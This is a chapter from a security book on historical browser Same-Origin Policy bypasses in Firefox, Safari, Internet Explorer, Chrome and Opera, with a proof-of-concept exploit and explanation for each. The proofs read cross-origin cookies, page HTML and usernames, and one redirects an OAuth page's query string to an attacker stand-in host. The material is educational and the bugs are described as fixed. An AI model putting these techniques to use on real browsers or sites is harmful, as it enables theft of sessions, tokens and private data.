# Browser Exploits

## Introduction

A book on JavaScript hacking wouldn't be complete without a chapter dedicated to browser exploits. Over the years, I've discovered various exploits in major browser engines, primarily during my spare time. I've been in the field of browser hacking for over 15 years, and during this time, I managed to find a Same-Origin Policy (SOP) bypass or information leak in every major browser engine.

Browser hacking is a niche yet fascinating area of research. It provides valuable insights that can be applied to other fields of cybersecurity. In this chapter, I will not present these exploits chronologically but will start with simpler bugs and gradually move on to more complex SOP bypasses.

## Firefox Incorrect Handling of Cross-Origin URLs

**Overview**

This Firefox bug was surprisingly simple, and it was unexpected that Mozilla’s automated tests didn’t catch it. The issue occurred when opening cross-origin windows and inspecting cross-origin objects.

**Exploit Details**

When you call `window.open`, the return value is a reference to the new window object. Unlike the normal window object, many properties are unavailable and throw exceptions when accessed. This restriction is essential because it prevents data theft from different origins, which could compromise user accounts.

The exploit allowed reading the `location` object of the new window after a delay, which should not be possible due to SOP. Here’s how it was done:

```html
<script>
function poc() {
    var win = window.open('https://twitter.com/lists/', 'newWin', 'width=200,height=200');
    setTimeout(function() {
        alert('Hello ' + /^https:\/\/twitter.com\/([^/]+)/.exec(win.location)[1]);
    }, 5000);
}
</script>
<input type=button value="Firefox knows" onclick="poc()">
```

**Explanation**

* **Step 1:** Open a new window pointing to a Twitter list URL.
* **Step 2:** Wait for 5 seconds, allowing redirection to a personalized URL.
* **Step 3:** Attempt to read the `location` object and extract the Twitter username using a regular expression.

## Safari Assignments to Cross-Origin Hostnames

**Overview**

In earlier times, browser hacking was more straightforward. This Safari bug illustrates the dangers of allowing assignments to cross-origin location objects.

**Exploit Details**

The issue involved setting the hostname of a cross-origin location object. Safari retained the query string and hash, which could contain sensitive information. Today, such a vulnerability could target OAuth tokens.

Here's how the exploit worked:

```html
<script>
function poc(iframe) {
    var win = iframe.contentWindow;
    setTimeout(function() {
        win.location.hostname = 'attacker.tld';
    }, 5000);
}
</script>
<iframe src="https://oauth.example.com" onload=poc(this)></iframe>
```

**Explanation**

* **Step 1:** Load an iframe pointing to a URL that performs authentication and contains sensitive data in the query string.
* **Step 2:** Wait for the page to load, then change the hostname of the iframe to the attacker's domain.
* **Step 3:** The attacker reads `location.search` on their domain to steal the secrets.

Modern browsers now prevent read/write access to host and hostname properties for cross-origin objects.

## Internet Explorer Full SOP Bypass

**Overview**

This bug was discovered while contracting for Microsoft, testing Internet Explorer (IE) features. The bug allowed executing arbitrary JavaScript on any domain, bypassing SOP.

**Exploit Details**

IE leaked a cross-origin constructor, allowing the Function constructor to be called from a different domain.

Here’s the proof of concept:

```html
<iframe src="https://garethheyes.co.uk" onload="this.contentWindow.closed.constructor.constructor('alert(document.cookie)')()"></iframe>
```

**Explanation**

* **Step 1:** Load an iframe pointing to an external domain.
* **Step 2:** Access the `closed` property, a boolean value, and chain it to call the Function constructor twice.
* **Step 3:** Execute arbitrary JavaScript with full access to the cross-origin window object.

## Chrome Partial SOP Infoleak

**Overview**

This bug in Chrome related to how `document.baseURI` was handled with nested iframes from different subdomains. The exploit allowed disclosing the entire URL of a cross-site iframe.

**Exploit Details**

Using nested iframes, the baseURI property of a nested iframe was incorrectly reported from the parent.

Here's the initial page setup:

```html
index.html:
<script>
onload = function() {
    x.contentWindow[0].location = 'about:blank';
    setTimeout(() => alert(x.contentWindow[0].document.baseURI), 500);
};
</script>
<iframe id=x src="//subdomain1.portswigger-labs.net/chrome-infoleak/target.html"></iframe>
```

**Explanation**

* **Step 1:** Load an iframe pointing to a subdomain URL.
* **Step 2:** Change the URL of the nested iframe to `about:blank`.
* **Step 3:** Read the `document.baseURI` property, which incorrectly shows the parent URL.

## Safari Full SOP Bypass

**Overview**

This bug was initially dismissed by Apple as a minor issue. However, it was a full SOP bypass that allowed reading cookies and HTML of any domain.

**Exploit Details**

Using nested iframes with an `about:blank` URL, you could access the innermost frame's document and read the content.

Here’s the full exploit:

```html
<script>
function breakSandbox() {
    var doc = window.frames.loader.document;
    var html = '';
    html += '<p>test</p><iframe src="http://www.amazon.co.uk/" id="iframe" name="iframe" onload="alert(window.frames.iframe.document.getElementsByTagName(\'body\')[0].innerHTML);alert(window.frames.iframe.document.cookie);"></iframe>';
    doc.body.innerHTML = html;
}
</script>
<iframe src="about:blank" name="loader" id="loader" onload="breakSandbox()"></iframe>
```

**Explanation**

* **Step 1:** Load an iframe pointing to an `about:blank` URL.
* **Step 2:** Inject another iframe inside it, pointing to an external domain.
* **Step 3:** Access and alert the inner HTML and cookies of the external domain.

## Opera SOP Bypass

**Overview**

This is one of my favorite browser bugs because it shows how SOP can be bypassed unexpectedly. The exploit involves manipulating prototype methods to execute arbitrary JavaScript.

**Exploit Details**

Opera leaked constructors in multiple places, allowing for cross-origin execution of arbitrary JavaScript.

Here’s the proof of concept:

```javascript
iframe.contentWindow.location.constructor.prototype.__defineGetter__.constructor('[].constructor.prototype.join=function(){alert("PWND:"+document.body.innerHTML)}')();
```

**Explanation**

* **Step 1:** Access the cross-origin location object to get the `__defineGetter__` property.
* **Step 2:** Use the constructor to define a custom `join` method on the Array prototype.
* **Step 3:** Execute the alert with the contents of the external domain’s body.

## Summary

I hope you enjoyed this chapter as much as I enjoyed writing it. Finding flaws in SOP is a technical challenge that provides a real sense of accomplishment. This chapter covered:

* Firefox’s flawed handling of the cross-origin location object.
* Safari's vulnerability to hostname assignments in cross-origin objects.
* Internet Explorer’s full SOP bypass with arbitrary JavaScript execution.
* Chrome’s info leak of subdomain URLs using nested iframes.
* Safari’s full SOP bypass allowing access to cookies and HTML.
* Opera’s unexpected SOP bypass using prototype methods.

I hope this chapter inspires you to explore and find your own browser vulnerabilities in modern browsers.

***
